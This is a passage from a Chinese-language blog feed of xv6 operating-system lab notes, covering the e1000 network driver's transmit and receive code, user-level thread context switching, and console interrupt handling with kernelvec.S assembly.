* */</span></span><br><span class="line">  <span class="keyword">if</span>((tail_desc-&gt;status &amp; E1000_TXD_STAT_DD) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//      printf(&quot;tx_ring buffer is overflow\n&quot;);</span></span><br><span class="line">      release(&amp;e1000_lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * todo: use mbuffree() to free the last mbuf that was transmitted from that descriptor</span></span><br><span class="line"><span class="comment">   * */</span></span><br><span class="line">  <span class="keyword">if</span>(tx_mbufs[index]) &#123;</span><br><span class="line">      mbuffree(tx_mbufs[index]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// todo: m-&gt;head points to the packet&#x27;s content in memory,</span></span><br><span class="line">  tail_desc-&gt;addr = (uint64)(m-&gt;head);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// todo: m-&gt;len is the packet length</span></span><br><span class="line">  tail_desc-&gt;length = m-&gt;len;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// todo: set the necessary cmd flag (look at Section 3.3 in the E1000 manual)</span></span><br><span class="line">  tail_desc-&gt;cmd |= E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// todo: stash away a pointer to the mbuf for later freeing.</span></span><br><span class="line">  tx_mbufs[index] = m;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// todo: update the E1000_TDT</span></span><br><span class="line">  regs[E1000_TDT] = (index + <span class="number">1</span>) % TX_RING_SIZE;</span><br><span class="line">  <span class="comment">// release lock</span></span><br><span class="line"></span><br><span class="line">  release(&amp;e1000_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="E1000-recv"><a href="#E1000-recv" class="headerlink" title="E1000_recv"></a>E1000_recv</h3><p>我们要注意的是，在接收数据包时，不是一个一个接收的，所以我们要不断更新index，需要接收的包都接收完毕为止。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"> ..</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-首先通过获取-E1000-RDT-控制寄存器并加一模-RX-RING-SIZE-来询问-E1000-下一个等待接收的数据包（如果有的话）位于环的哪个索引位置。"><a href="#1-首先通过获取-E1000-RDT-控制寄存器并加一模-RX-RING-SIZE-来询问-E1000-下一个等待接收的数据包（如果有的话）位于环的哪个索引位置。" class="headerlink" title="1.首先通过获取 E1000_RDT 控制寄存器并加一模 RX_RING_SIZE 来询问 E1000 下一个等待接收的数据包（如果有的话）位于环的哪个索引位置。"></a>1.首先通过获取 <code>E1000_RDT</code> 控制寄存器并加一模 <code>RX_RING_SIZE</code> 来询问 E1000 下一个等待接收的数据包（如果有的话）位于环的哪个索引位置。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint32 index = (regs[E1000_RDT] + <span class="number">1</span>) % RX_RING_SIZE; <span class="comment">// fetch the index</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rx_desc</span> *<span class="title">des</span> =</span> &amp;rx_ring[index]; <span class="comment">// fetch the desc</span></span><br></pre></td></tr></table></figure><h4 id="2-然后通过检查描述符的状态部分中的-E1000-RXD-STAT-DD-位来检查是否有新数据包可用。如果没有，停止。"><a href="#2-然后通过检查描述符的状态部分中的-E1000-RXD-STAT-DD-位来检查是否有新数据包可用。如果没有，停止。" class="headerlink" title="2.然后通过检查描述符的状态部分中的 E1000_RXD_STAT_DD 位来检查是否有新数据包可用。如果没有，停止。"></a>2.然后通过检查描述符的状态部分中的 <code>E1000_RXD_STAT_DD</code> 位来检查是否有新数据包可用。如果没有，停止。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(des-&gt;status &amp; E1000_RXD_STAT_DD)) &#123; <span class="comment">// 如果当前描述符的状态为不可用，则停止</span></span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-否则，将-mbuf-的-m-gt-len-更新为描述符报告的长度。使用-net-rx-将-mbuf-交给网络栈。"><a href="#3-否则，将-mbuf-的-m-gt-len-更新为描述符报告的长度。使用-net-rx-将-mbuf-交给网络栈。" class="headerlink" title="3.否则，将 mbuf 的 m-&gt;len 更新为描述符报告的长度。使用 net_rx() 将 mbuf 交给网络栈。"></a>3.否则，将 <code>mbuf</code> 的 <code>m-&gt;len</code> 更新为描述符报告的长度。使用 <code>net_rx()</code> 将 <code>mbuf</code> 交给网络栈。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">buf</span> =</span> rx_mbufs[index];</span><br><span class="line">buf-&gt;len = des-&gt;length;</span><br><span class="line">net_rx(buf);</span><br></pre></td></tr></table></figure><h4 id="4-然后使用-mbufalloc-分配一个新的-mbuf-来替换刚刚给-net-rx-的那个。将其数据指针（m-gt-head）编程到描述符中。将描述符的状态位清零。"><a href="#4-然后使用-mbufalloc-分配一个新的-mbuf-来替换刚刚给-net-rx-的那个。将其数据指针（m-gt-head）编程到描述符中。将描述符的状态位清零。" class="headerlink" title="4.然后使用 mbufalloc() 分配一个新的 mbuf 来替换刚刚给 net_rx() 的那个。将其数据指针（m-&gt;head）编程到描述符中。将描述符的状态位清零。"></a>4.然后使用 <code>mbufalloc()</code> 分配一个新的 <code>mbuf</code> 来替换刚刚给 <code>net_rx()</code> 的那个。将其数据指针（<code>m-&gt;head</code>）编程到描述符中。将描述符的状态位清零。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">new_buf</span> =</span> mbufalloc(<span class="number">0</span>);</span><br><span class="line">rx_mbufs[index] = new_buf;</span><br><span class="line">des-&gt;addr = (uint64)new_buf-&gt;head;</span><br><span class="line">des-&gt;status = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h4 id="5-最后，将-E1000-RDT-寄存器更新为最后处理的环描述符的索引。-1"><a href="#5-最后，将-E1000-RDT-寄存器更新为最后处理的环描述符的索引。-1" class="headerlink" title="5.最后，将 E1000_RDT 寄存器更新为最后处理的环描述符的索引。"></a>5.最后，将 <code>E1000_RDT</code> 寄存器更新为最后处理的环描述符的索引。</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regs[E1000_RDT] = index;</span><br></pre></td></tr></table></figure><h4 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">e1000_recv</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check for packets that have arrived from the e1000</span></span><br><span class="line">  <span class="comment">// Create and deliver an mbuf for each packet (using net_rx()).</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// todo: First ask the E1000 for the ring index at which the next waiting received packet (if any) is located,</span></span><br><span class="line">      <span class="comment">// todo: by fetching the E1000_RDT control register and adding one modulo RX_RING_SIZE.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">// todo: check if a new packet is available by checking for the E1000_RXD_STAT_DD bit in the status portion of the descriptor.</span></span><br><span class="line">      uint32 index = (regs[E1000_RDT] + <span class="number">1</span>) % RX_RING_SIZE; <span class="comment">// fetch the index</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">rx_desc</span> *<span class="title">des</span> =</span> &amp;rx_ring[index];</span><br><span class="line">      <span class="keyword">if</span>(!(des-&gt;status &amp; E1000_RXD_STAT_DD)) &#123;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// todo: update the mbuf&#x27;s m-&gt;len to the length reported in the descriptor. Deliver the mbuf to the network stack using net_rx().</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">buf</span> =</span> rx_mbufs[index];</span><br><span class="line">      buf-&gt;len = des-&gt;length;</span><br><span class="line">      net_rx(buf);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// todo: Then allocate a new mbuf using mbufalloc() to replace the one just given to net_rx().</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">new_buf</span> =</span> mbufalloc(<span class="number">0</span>);</span><br><span class="line">      rx_mbufs[index] = new_buf;</span><br><span class="line">      <span class="comment">// todo: Program its data pointer (m-&gt;head) into the descriptor. Clear the descriptor&#x27;s status bits to zero.</span></span><br><span class="line">      des-&gt;addr = (uint64)new_buf-&gt;head;</span><br><span class="line">      des-&gt;status = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">// todo: Finally, update the E1000_RDT register to be the index of the last ring descriptor processed.</span></span><br><span class="line">      regs[E1000_RDT] = index;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lab-networking&quot;&gt;&lt;a href=&quot;#Lab-networking&quot; class=&quot;headerlink&quot; title=&quot;Lab: networking&quot;&gt;&lt;/a&gt;Lab: networking&lt;/h1&gt;&lt;p&gt;这个实验需要写一个&lt;code&gt;xv6&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Lab: Multithreading
</title>
    <link href="http://example.com/2024/03/15/Lab-Multithreading/"/>
    <id>http://example.com/2024/03/15/Lab-Multithreading/</id>
    <published>2024-03-15T03:40:44.000Z</published>
    <updated>2024-03-17T03:29:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lab-Multithreading"><a href="#Lab-Multithreading" class="headerlink" title="Lab: Multithreading"></a>Lab: Multithreading</h1><p>这个实验室将帮助你熟悉多线程编程。你将在用户级线程包中实现线程间的切换，使用多个线程加速程序，并实现一个屏障。</p><h2 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h2><p>在这个练习中，你将为用户级线程系统设计上下文切换机制，并实现它。为了帮助你开始，你的 xv6 包含两个文件：user&#x2F;uthread.c 和 user&#x2F;uthread_switch.S，以及 Makefile 中构建 uthread 程序的规则。uthread.c 包含了大部分用户级线程包的代码，以及三个简单测试线程的代码。线程包缺少一些创建线程和线程间切换的代码。</p><blockquote><p>你的任务是制定一个计划来创建线程，并保存&#x2F;恢复寄存器以便于线程间切换，然后实现该计划。完成后，运行 make grade 应该会显示你的解决方案通过了 uthread 测试。</p></blockquote><p>一旦你完成了任务，当你在 xv6 上运行 uthread 时，你应该会看到以下输出（三个线程可能会以不同的顺序启动）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make qemu</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">uthread</span></span><br><span class="line">thread_a started</span><br><span class="line">thread_b started</span><br><span class="line">thread_c started</span><br><span class="line">thread_c 0</span><br><span class="line">thread_a 0</span><br><span class="line">thread_b 0</span><br><span class="line">thread_c 1</span><br><span class="line">thread_a 1</span><br><span class="line">thread_b 1</span><br><span class="line">...</span><br><span class="line">thread_c 99</span><br><span class="line">thread_a 99</span><br><span class="line">thread_b 99</span><br><span class="line">thread_c: exit after 100</span><br><span class="line">thread_a: exit after 100</span><br><span class="line">thread_b: exit after 100</span><br><span class="line">thread_schedule: no runnable threads</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure><p>这个输出来自三个测试线程，每个线程都有一个循环，打印一行，然后将 CPU 让给其他线程。</p><p>然而，在这一点上，由于没有上下文切换代码，你将看不到任何输出。</p><p>你需要在 <code>user/uthread.c</code> 中的 <code>thread_create()</code> 和 <code>thread_schedule()</code> 以及 <code>user/uthread_switch.S</code> 中的 <code>thread_switch</code> 添加代码。一个目标是确保当 <code>thread_schedule()</code> 首次运行给定线程时，该线程在自己的栈上执行传递给 <code>thread_create()</code> 的函数。另一个目标是确保 <code>thread_switch</code> 保存被切换的线程的寄存器，恢复被切换到的线程的寄存器，并返回到后者线程的指令中它上次停止的点。你将需要决定在哪里保存&#x2F;恢复寄存器；修改 <code>struct thread</code> 来保存寄存器是一个好计划。你需要在 <code>thread_schedule</code> 中添加对 <code>thread_switch</code> 的调用；你可以传递任何你需要的参数给 <code>thread_switch</code>，但意图是从线程 <code>t</code> 切换到 <code>next_thread</code>。</p><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ul><li><p><code>thread_switch</code>只需要保存&#x2F;恢复<code>callee-save registers</code>。为什么？</p></li><li><p>在<code>user/uthread.asm</code>，你可以查看<code>uthread</code>的汇编代码，这可能对调试很方便。</p></li><li><p>检测代码可以单步执行<code>thread_switch</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) file user/_uthread</span><br><span class="line">Reading symbols from user/_uthread...</span><br><span class="line">(gdb) b uthread.c:60</span><br></pre></td></tr></table></figure><p>这在uthread.c的第60行设置了一个断点。断点可能会在您运行uthread之前触发（也可能不会）触发。这怎么可能发生？</p><p>一旦你的 xv6 shell 运行起来，输入 “uthread”，gdb 将会在第60行处中断。如果你从另一个进程中击中了断点，继续进行，直到在 uthread 进程中击中断点。现在，你可以输入如下命令来检查 uthread 的状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x *next_thread</span><br></pre></td></tr></table></figure><p>使用 “x”，你可以检查内存位置的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x next_thread-&gt;stack</span><br></pre></td></tr></table></figure><p>你可以这样跳到 thread_switch 的开始部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b thread_switch</span><br><span class="line">(gdb) c</span><br></pre></td></tr></table></figure><p>You can single step assembly instructions using:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) si</span><br></pre></td></tr></table></figure><p>On-line documentation for gdb is here.</p></li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><code>thread</code>的本质就是共享内存的<code>process</code>，因此我们可以根据<code>process</code>中对应的<code>swtch.S</code>，<code>allocpro()</code>，<code>struct context context</code>进行修改即可。</p><p><code>struct context</code>中直接声明了我们需要保存的<code>callee-saved register</code>，直接将定义搬到<code>uthread.c</code>中，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  uint64 ra;</span><br><span class="line">  uint64 sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// callee-saved</span></span><br><span class="line">  uint64 s0;</span><br><span class="line">  uint64 s1;</span><br><span class="line">  uint64 s2;</span><br><span class="line">  uint64 s3;</span><br><span class="line">  uint64 s4;</span><br><span class="line">  uint64 s5;</span><br><span class="line">  uint64 s6;</span><br><span class="line">  uint64 s7;</span><br><span class="line">  uint64 s8;</span><br><span class="line">  uint64 s9;</span><br><span class="line">  uint64 s10;</span><br><span class="line">  uint64 s11;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>并为<code>struct thread</code>添加相应字段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="type">char</span>       <span class="built_in">stack</span>[STACK_SIZE]; <span class="comment">/* the thread&#x27;s stack */</span></span><br><span class="line">  <span class="type">int</span>        state;             <span class="comment">/* FREE, RUNNING, RUNNABLE */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>       <span class="comment">/* the thread&#x27;s context */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>直接将<code>switch.S</code>复制到<code>uthread_switch.c</code>中，并在<code>thread_schedule()</code>中添加：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thread_switch((uint64)&amp;(t-&gt;context), (uint64)&amp;(current_thread-&gt;context));</span><br></pre></td></tr></table></figure><h2 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h2><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lab-Multithreading&quot;&gt;&lt;a href=&quot;#Lab-Multithreading&quot; class=&quot;headerlink&quot; title=&quot;Lab: Multithreading&quot;&gt;&lt;/a&gt;Lab: Multithreading&lt;/h1&gt;&lt;p&gt;这个实验</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>xv6-interrputs</title>
    <link href="http://example.com/2024/03/12/xv6-interrputs/"/>
    <id>http://example.com/2024/03/12/xv6-interrputs/</id>
    <published>2024-03-12T10:59:14.000Z</published>
    <updated>2024-03-12T11:00:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;中断&quot;&gt;&lt;a href=&quot;#中断&quot; class=&quot;headerlink&quot; title=&quot;中断&quot;&gt;&lt;/a&gt;中断&lt;/h1&gt;&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Lab: Copy-on-Write Fork for xv6</title>
    <link href="http://example.com/2024/03/08/Lab-Copy-on-Write-Fork-for-xv6/"/>
    <id>http://example.com/2024/03/08/Lab-Copy-on-Write-Fork-for-xv6/</id>
    <published>2024-03-08T12:03:25.000Z</published>
    <updated>2024-03-12T10:22:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lab-Copy-on-Write-Fork-for-xv6"><a href="#Lab-Copy-on-Write-Fork-for-xv6" class="headerlink" title="Lab: Copy-on-Write Fork for xv6"></a>Lab: Copy-on-Write Fork for xv6</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>我们先说一下整个流程</p><p>设备驱动器也会产生中断，这也是一种陷阱。</p><p>许多设备驱动器在两种上下文中执行代码：</p><ul><li><code>top half</code>运行在进程的内核线程上。上半部分是通过诸如read和write这样的系统调用来调用的，这些调用希望设备执行I&#x2F;O操作。</li><li><code>bottom half</code>是驱动器中断处理程序。</li></ul><h3 id="5-1-Code-Console-input"><a href="#5-1-Code-Console-input" class="headerlink" title="5.1 Code: Console input"></a>5.1 Code: Console input</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户键入字符 =&gt; RISC-V 上的 UART 串行接口 =&gt; console 驱动器 </span><br></pre></td></tr></table></figure><p><code>UART</code>硬件对于软件来说是一组内存映射控制寄存器,<code>RISC-V</code>硬件有一些物理地址链接<code>UART</code>设备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">main() = call =&gt; consoleinit    =&gt;</span><br><span class="line">             |initialize the UART|</span><br></pre></td></tr></table></figure><p><code>consoleinit</code>初始化UART硬件，配置<code>UART</code>在接收到字节输入时，产生一个接收中断<code>receive interrupt</code>；在完成输出一个字节的数据时，产生一个传输中断，<code>transmit interrput</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">init.c = open =&gt; file descriptor for console (fp)</span><br><span class="line"></span><br><span class="line">xv6 shell reads from fp</span><br><span class="line"></span><br><span class="line">= call =&gt; read() = invoke =&gt; consoleread() </span><br><span class="line"></span><br><span class="line">consoleread() wait for input arrive (via interrupt) and be buffered in cons.buf</span><br></pre></td></tr></table></figure><p>中断是如何产生的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用户键入字符 =&gt; UART =&gt; 让RISC-V产生中断 =&gt; 激活xv6陷阱处理程序 trap handler</span><br><span class="line"></span><br><span class="line">trap handler = invoke =&gt; devintr() = 在 scause 寄存器中发现中断来自额外设备</span><br><span class="line"></span><br><span class="line">硬件唤醒 PLIC 告知哪个设备产生的中断，如果是UART devintr 调用 uartintr</span><br></pre></td></tr></table></figure><p>数据如何输入的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uartintr = 从UART硬件的等待输入字符中读取并传输给 =&gt; consoleintr</span><br><span class="line"></span><br><span class="line">consoleintr 将输入的字符存入cons.buf中，直到一行输入完成。</span><br><span class="line"></span><br><span class="line">当一个新的行到达时，consoleintr 唤醒 consoleread</span><br></pre></td></tr></table></figure><h3 id="kernelvec-S"><a href="#kernelvec-S" class="headerlink" title="kernelvec.S:"></a><code>kernelvec.S</code>:</h3><h4 id="kernelvec"><a href="#kernelvec" class="headerlink" title="kernelvec"></a><code>kernelvec</code></h4><p>当处于<code>Supervisor mode</code>时，中断<code>interrupts</code>和异常<code>exception</code>会来到这里。</p><p>当前堆栈为<code>kernel stack</code>。将所有寄存器的值推入栈中，调用<code>kerneltrap()</code>，调用完成时恢复寄存器然后返回。</p><blockquote><p>这段注释是关于寄存器<code>tp</code>（Thread Pointer）的说明，它通常包含当前硬件线程的ID（hartid）。注释指出不使用<code>tp</code>寄存器的值，以防在中断或异常发生后处理器（CPU）发生了变化。</p><p>在多核心或多线程的CPU环境中，每个核心或线程有一个唯一的标识符，通常称为hartid。当一个核心或线程正在执行任务时，它可能会因为中断或调度策略而切换到另一个CPU。如果在中断处理或任务切换过程中代码依赖于特定的<code>tp</code>值，而这个值在不同的CPU之间是不同的，就可能出现问题。</p><p>因此，这段注释表明，由于可能会发生CPU切换，代码不应该假设<code>tp</code>寄存器中的hartid在处理过程中是不变的。这是在多核处理器环境中进行系统编程时需要注意的并发和一致性问题之一。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">.globl kerneltrap</span><br><span class="line">.globl kernelvec</span><br><span class="line">.align 4</span><br><span class="line">kernelvec:</span><br><span class="line">        # make room to save registers.</span><br><span class="line">        # 在栈中开辟空间</span><br><span class="line">        addi sp, sp, -256</span><br><span class="line"></span><br><span class="line">        # save the registers.</span><br><span class="line">        sd ra, 0(sp)</span><br><span class="line">        sd sp, 8(sp)# 保存stack pointer</span><br><span class="line">        sd gp, 16(sp)</span><br><span class="line">        sd tp, 24(sp)</span><br><span class="line">        sd t0, 32(sp)</span><br><span class="line">        sd t1, 40(sp)</span><br><span class="line">        sd t2, 48(sp)</span><br><span class="line">        sd s0, 56(sp)</span><br><span class="line">        sd s1, 64(sp)</span><br><span class="line">        sd a0, 72(sp)</span><br><span class="line">        sd a1, 80(sp)</span><br><span class="line">        sd a2, 88(sp)</span><br><span class="line">        sd a3, 96(sp)</span><br><span class="line">        sd a4, 104(sp)</span><br><span class="line">        sd a5, 112(sp)</span><br><span class="line">        sd a6, 120(sp)</span><br><span class="line">        sd a7, 128(sp)</span><br><span class="line">        sd s2, 136(sp)</span><br><span class="line">        sd s3, 144(sp)</span><br><span class="line">        sd s4, 152(sp)</span><br><span class="line">        sd s5, 160(sp)</span><br><span class="line">        sd s6, 168(sp)</span><br><span class="line">        sd s7, 176(sp)</span><br><span class="line">        sd s8, 184(sp)</span><br><span class="line">        sd s9, 192(sp)</span><br><span class="line">        sd s10, 200(sp)</span><br><span class="line">        sd s11, 208(sp)</span><br><span class="line">        sd t3, 216(sp)</span><br><span class="line">        sd t4, 224(sp)</span><br><span class="line">        sd t5, 232(sp)</span><br><span class="line">        sd t6, 240(sp)</span><br><span class="line"></span><br><span class="line">        # call the C trap handler in trap.c</span><br><span class="line">        call kerneltrap</span><br><span class="line"></span><br><span class="line">        # restore registers.</span><br><span class="line">        ld ra, 0(sp)</span><br><span class="line">        ld sp, 8(sp)</span><br><span class="line">        ld 